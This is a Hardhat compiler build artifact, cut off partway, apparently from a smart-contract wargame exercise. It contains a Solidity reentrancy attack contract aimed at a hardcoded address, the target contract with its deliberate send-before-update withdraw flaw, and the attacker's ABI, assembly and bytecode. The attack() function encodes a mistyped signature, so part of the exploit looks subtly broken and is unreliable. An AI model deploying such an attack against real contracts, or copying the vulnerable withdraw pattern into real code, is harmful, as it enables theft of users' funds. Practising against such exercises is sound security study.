{
	"id": "891c9bc3e2b4c48b431e5f572dfe3f57",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.0",
	"solcLongVersion": "0.6.0+commit.26b70077",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/AttackReen.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"./Reentrance.sol\";\n\ncontract AttackReen {\n    Reentrance public r = Reentrance(0x25c951baC0B1418718822dbED066d7FE230Eb0C0);\n    uint public amount = 1 ether;\n\n    function contribute() public payable {\n        r.donate.value(amount).gas(4000000)(address(this));\n    }\n    function attack() public {\n        (bool success, bytes memory result) = address(r).call(abi.encodeWithSignature(\"withdraw(uint)\", 100));\n    }\n    receive() external payable {\n        if (address(r).balance != 0 ) {\n            r.withdraw(amount); \n        }\n    }\n}"
			},
			"contracts/Reentrance.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol\";\n\ncontract Reentrance {\n  \n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call.value(_amount)(\"\");\n      if(result) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  receive() external payable {}\n}"
			},
			"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: MIT\n\npragma solidity >=0.6.0 <0.8.0;\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        uint256 c = a + b;\n        if (c < a) return (false, 0);\n        return (true, c);\n    }\n\n    /**\n     * @dev Returns the substraction of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b > a) return (false, 0);\n        return (true, a - b);\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) return (true, 0);\n        uint256 c = a * b;\n        if (c / a != b) return (false, 0);\n        return (true, c);\n    }\n\n    /**\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b == 0) return (false, 0);\n        return (true, a / b);\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\n     *\n     * _Available since v3.4._\n     */\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        if (b == 0) return (false, 0);\n        return (true, a % b);\n    }\n\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     *\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b <= a, \"SafeMath: subtraction overflow\");\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     *\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) return 0;\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"SafeMath: division by zero\");\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        require(b > 0, \"SafeMath: modulo by zero\");\n        return a % b;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {trySub}.\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     *\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        return a - b;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryDiv}.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        return a / b;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * reverting with custom message when dividing by zero.\n     *\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\n     * message unnecessarily. For custom revert reasons use {tryMod}.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     *\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        return a % b;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/AttackReen.sol": {
				"AttackReen": {
					"abi": [
						{
							"inputs": [],
							"name": "amount",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "attack",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "contribute",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "r",
							"outputs": [
								{
									"internalType": "contract Reentrance",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"contracts/AttackReen.sol\":85:604  contract AttackReen {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/AttackReen.sol\":144:186  0x25c951baC0B1418718822dbED066d7FE230Eb0C0 */\n  0x25c951bac0b1418718822dbed066d7fe230eb0c0\n    /* \"contracts/AttackReen.sol\":111:187  Reentrance public r = Reentrance(0x25c951baC0B1418718822dbED066d7FE230Eb0C0) */\n  0x00\n  dup1\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/AttackReen.sol\":214:221  1 ether */\n  0x0de0b6b3a7640000\n    /* \"contracts/AttackReen.sol\":193:221  uint public amount = 1 ether */\n  0x01\n  sstore\n    /* \"contracts/AttackReen.sol\":85:604  contract AttackReen {... */\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"contracts/AttackReen.sol\":85:604  contract AttackReen {... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/AttackReen.sol\":85:604  contract AttackReen {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6c8ae38c\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xaa8c217c\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd7bb99ba\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/AttackReen.sol\":548:549  0 */\n      0x00\n        /* \"contracts/AttackReen.sol\":534:535  r */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackReen.sol\":526:544  address(r).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/AttackReen.sol\":526:549  address(r).balance != 0 */\n      eq\n        /* \"contracts/AttackReen.sol\":522:596  if (address(r).balance != 0 ) {... */\n      tag_9\n      jumpi\n        /* \"contracts/AttackReen.sol\":566:567  r */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackReen.sol\":566:576  r.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x2e1a7d4d\n        /* \"contracts/AttackReen.sol\":577:583  amount */\n      sload(0x01)\n        /* \"contracts/AttackReen.sol\":566:584  r.withdraw(amount) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_10:\n        /* \"contracts/AttackReen.sol\":566:584  r.withdraw(amount) */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_12\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_12:\n        /* \"contracts/AttackReen.sol\":566:584  r.withdraw(amount) */\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/AttackReen.sol\":522:596  if (address(r).balance != 0 ) {... */\n    tag_9:\n        /* \"contracts/AttackReen.sol\":85:604  contract AttackReen {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/AttackReen.sol\":111:187  Reentrance public r = Reentrance(0x25c951baC0B1418718822dbED066d7FE230Eb0C0) */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_13:\n        /* \"contracts/AttackReen.sol\":111:187  Reentrance public r = Reentrance(0x25c951baC0B1418718822dbED066d7FE230Eb0C0) */\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/AttackReen.sol\":337:480  function attack() public {... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_16\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_16:\n        /* \"contracts/AttackReen.sol\":337:480  function attack() public {... */\n      pop\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      stop\n        /* \"contracts/AttackReen.sol\":193:221  uint public amount = 1 ether */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_19\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_19:\n        /* \"contracts/AttackReen.sol\":193:221  uint public amount = 1 ether */\n      pop\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/AttackReen.sol\":228:332  function contribute() public payable {... */\n    tag_6:\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      stop\n        /* \"contracts/AttackReen.sol\":111:187  Reentrance public r = Reentrance(0x25c951baC0B1418718822dbED066d7FE230Eb0C0) */\n    tag_15:\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/AttackReen.sol\":337:480  function attack() public {... */\n    tag_18:\n        /* \"contracts/AttackReen.sol\":373:385  bool success */\n      0x00\n        /* \"contracts/AttackReen.sol\":387:406  bytes memory result */\n      0x60\n        /* \"contracts/AttackReen.sol\":418:419  r */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackReen.sol\":410:425  address(r).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackReen.sol\":468:471  100 */\n      0x64\n        /* \"contracts/AttackReen.sol\":426:472  abi.encodeWithSignature(\"withdraw(uint)\", 100) */\n      add(0x24, mload(0x40))\n      dup1\n      dup3\n      0xff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"contracts/AttackReen.sol\":426:472  abi.encodeWithSignature(\"withdraw(uint)\", 100) */\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x8ba1456200000000000000000000000000000000000000000000000000000000)\n        /* \"--CODEGEN--\":38:42   */\n      0x20\n        /* \"--CODEGEN--\":29:36   */\n      dup3\n        /* \"--CODEGEN--\":25:43   */\n      add\n        /* \"--CODEGEN--\":67:77   */\n      dup1\n        /* \"--CODEGEN--\":61:78   */\n      mload\n        /* \"--CODEGEN--\":96:154   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"--CODEGEN--\":199:207   */\n      dup4\n        /* \"--CODEGEN--\":192:196   */\n      dup2\n        /* \"--CODEGEN--\":186:190   */\n      dup4\n        /* \"--CODEGEN--\":182:197   */\n      and\n        /* \"--CODEGEN--\":179:208   */\n      or\n        /* \"--CODEGEN--\":167:177   */\n      dup4\n        /* \"--CODEGEN--\":160:209   */\n      mstore\n        /* \"--CODEGEN--\":0:215   */\n      pop\n      pop\n      pop\n        /* \"contracts/AttackReen.sol\":426:472  abi.encodeWithSignature(\"withdraw(uint)\", 100) */\n      pop\n        /* \"contracts/AttackReen.sol\":410:473  address(r).call(abi.encodeWithSignature(\"withdraw(uint)\", 100)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":36:189   */\n    tag_25:\n        /* \"--CODEGEN--\":66:68   */\n      0x20\n        /* \"--CODEGEN--\":61:64   */\n      dup4\n        /* \"--CODEGEN--\":58:69   */\n      lt\n        /* \"--CODEGEN--\":36:189   */\n      tag_27\n      jumpi\n        /* \"--CODEGEN--\":182:185   */\n      dup1\n        /* \"--CODEGEN--\":176:186   */\n      mload\n        /* \"--CODEGEN--\":171:174   */\n      dup3\n        /* \"--CODEGEN--\":164:187   */\n      mstore\n        /* \"--CODEGEN--\":98:100   */\n      0x20\n        /* \"--CODEGEN--\":93:96   */\n      dup3\n        /* \"--CODEGEN--\":89:101   */\n      add\n        /* \"--CODEGEN--\":82:101   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":123:125   */\n      0x20\n        /* \"--CODEGEN--\":118:121   */\n      dup2\n        /* \"--CODEGEN--\":114:126   */\n      add\n        /* \"--CODEGEN--\":107:126   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":148:150   */\n      0x20\n        /* \"--CODEGEN--\":143:146   */\n      dup4\n        /* \"--CODEGEN--\":139:151   */\n      sub\n        /* \"--CODEGEN--\":132:151   */\n      swap3\n      pop\n        /* \"--CODEGEN--\":36:189   */\n      jump(tag_25)\n    tag_27:\n        /* \"--CODEGEN--\":274:275   */\n      0x01\n        /* \"--CODEGEN--\":267:270   */\n      dup4\n        /* \"--CODEGEN--\":263:265   */\n      0x20\n        /* \"--CODEGEN--\":259:271   */\n      sub\n        /* \"--CODEGEN--\":254:257   */\n      0x0100\n        /* \"--CODEGEN--\":250:272   */\n      exp\n        /* \"--CODEGEN--\":246:276   */\n      sub\n        /* \"--CODEGEN--\":315:319   */\n      dup1\n        /* \"--CODEGEN--\":311:320   */\n      not\n        /* \"--CODEGEN--\":305:308   */\n      dup3\n        /* \"--CODEGEN--\":299:309   */\n      mload\n        /* \"--CODEGEN--\":295:321   */\n      and\n        /* \"--CODEGEN--\":356:360   */\n      dup2\n        /* \"--CODEGEN--\":350:353   */\n      dup5\n        /* \"--CODEGEN--\":344:354   */\n      mload\n        /* \"--CODEGEN--\":340:361   */\n      and\n        /* \"--CODEGEN--\":389:396   */\n      dup1\n        /* \"--CODEGEN--\":380:387   */\n      dup3\n        /* \"--CODEGEN--\":377:397   */\n      or\n        /* \"--CODEGEN--\":372:375   */\n      dup6\n        /* \"--CODEGEN--\":365:398   */\n      mstore\n        /* \"--CODEGEN--\":3:402   */\n      pop\n      pop\n      pop\n        /* \"contracts/AttackReen.sol\":410:473  address(r).call(abi.encodeWithSignature(\"withdraw(uint)\", 100)) */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n        /* \"--CODEGEN--\":12:13   */\n      dup1\n        /* \"--CODEGEN--\":19:20   */\n      0x00\n        /* \"--CODEGEN--\":14:41   */\n      dup2\n      eq\n      tag_30\n      jumpi\n        /* \"--CODEGEN--\":67:71   */\n      0x40\n        /* \"--CODEGEN--\":61:72   */\n      mload\n        /* \"--CODEGEN--\":56:72   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":134:138   */\n      0x1f\n        /* \"--CODEGEN--\":130:139   */\n      not\n        /* \"--CODEGEN--\":123:127   */\n      0x3f\n        /* \"--CODEGEN--\":105:121   */\n      returndatasize\n        /* \"--CODEGEN--\":101:128   */\n      add\n        /* \"--CODEGEN--\":97:140   */\n      and\n        /* \"--CODEGEN--\":94:95   */\n      dup3\n        /* \"--CODEGEN--\":90:141   */\n      add\n        /* \"--CODEGEN--\":84:88   */\n      0x40\n        /* \"--CODEGEN--\":77:142   */\n      mstore\n        /* \"--CODEGEN--\":157:173   */\n      returndatasize\n        /* \"--CODEGEN--\":154:155   */\n      dup3\n        /* \"--CODEGEN--\":147:174   */\n      mstore\n        /* \"--CODEGEN--\":211:227   */\n      returndatasize\n        /* \"--CODEGEN--\":208:209   */\n      0x00\n        /* \"--CODEGEN--\":201:205   */\n      0x20\n        /* \"--CODEGEN--\":198:199   */\n      dup5\n        /* \"--CODEGEN--\":194:206   */\n      add\n        /* \"--CODEGEN--\":179:228   */\n      returndatacopy\n        /* \"--CODEGEN--\":5:233   */\n      jump(tag_29)\n        /* \"--CODEGEN--\":14:41   */\n    tag_30:\n        /* \"--CODEGEN--\":32:36   */\n      0x60\n        /* \"--CODEGEN--\":27:36   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":5:233   */\n    tag_29:\n      pop\n        /* \"contracts/AttackReen.sol\":372:473  (bool success, bytes memory result) = address(r).call(abi.encodeWithSignature(\"withdraw(uint)\", 100)) */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"contracts/AttackReen.sol\":337:480  function attack() public {... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/AttackReen.sol\":193:221  uint public amount = 1 ether */\n    tag_21:\n      sload(0x01)\n      dup2\n      jump\t// out\n        /* \"contracts/AttackReen.sol\":228:332  function contribute() public payable {... */\n    tag_23:\n        /* \"contracts/AttackReen.sol\":275:276  r */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/AttackReen.sol\":275:283  r.donate */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x362a95\n        /* \"contracts/AttackReen.sol\":290:296  amount */\n      sload(0x01)\n        /* \"contracts/AttackReen.sol\":302:309  4000000 */\n      0x3d0900\n        /* \"contracts/AttackReen.sol\":275:310  r.donate.value(amount).gas(4000000) */\n      swap1\n        /* \"contracts/AttackReen.sol\":319:323  this */\n      address\n        /* \"contracts/AttackReen.sol\":275:325  r.donate.value(amount).gas(4000000)(address(this)) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup10\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_32\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_32:\n        /* \"contracts/AttackReen.sol\":275:325  r.donate.value(amount).gas(4000000)(address(this)) */\n      pop\n      dup9\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_34\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_34:\n        /* \"contracts/AttackReen.sol\":275:325  r.donate.value(amount).gas(4000000)(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/AttackReen.sol\":228:332  function contribute() public payable {... */\n      jump\t// out\n\n    auxdata: 0xa26469706673582212207f89780f5212765aafa96928e2508bbbe614cd41d3395d2a73a49e7c781bac6364736f6c63430006000033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60806040527325c951bac0b1418718822dbed066d7fe230eb0c06000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550670de0b6b3a764000060015534801561007057600080fd5b50610455806100806000396000f3fe6080604052600436106100435760003560e01c80636c8ae38c1461011e5780639e5faafc14610175578063aa8c217c1461018c578063d7bb99ba146101b757610119565b366101195760008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163114610117576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6001546040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156100fe57600080fd5b505af1158015610112573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012a57600080fd5b506101336101c1565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561018157600080fd5b5061018a6101e6565b005b34801561019857600080fd5b506101a1610357565b6040518082815260200191505060405180910390f35b6101bf61035d565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600060606000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166064604051602401808260ff1681526020019150506040516020818303038152906040527f8ba14562000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106102e757805182526020820191506020810190506020830392506102c4565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610349576040519150601f19603f3d011682016040523d82523d6000602084013e61034e565b606091505b50915091505050565b60015481565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1662362a95600154623d090090306040518463ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019150506000604051808303818589803b15801561040357600080fd5b5088f1158015610417573d6000803e3d6000fd5b50505050505056fea26469706673582212207f89780f5212765aafa96928e2508bbbe614cd41d3395d2a73a49e7c781bac6364736f6c63430006000033",
